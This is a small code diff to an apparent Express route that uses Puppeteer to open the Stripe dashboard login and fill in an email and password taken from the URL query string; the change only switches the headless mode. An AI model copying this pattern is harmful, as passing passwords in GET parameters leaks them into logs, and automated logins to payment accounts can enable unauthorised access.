@@ -20,7 +20,7 @@ app.get("/view", urlEncoded, (req, res) => {
  const {email, pass} = req.query;
 
 (async () => {
-  const browser = await puppeteer.launch({args:["--no-sandbox", "--disable-setuid-sandbox", "--single-process", "--no-zygote"] , executablePath: process.env.NODE_ENV === "production" ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath(), headless: false});
+  const browser = await puppeteer.launch({args:["--no-sandbox", "--disable-setuid-sandbox", "--single-process", "--no-zygote"] , executablePath: process.env.NODE_ENV === "production" ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath(), headless: "new"});
   const [page] = await browser.pages();
   await page.goto('https://dashboard.stripe.com/login');
   await page.locator("#email").fill(email)
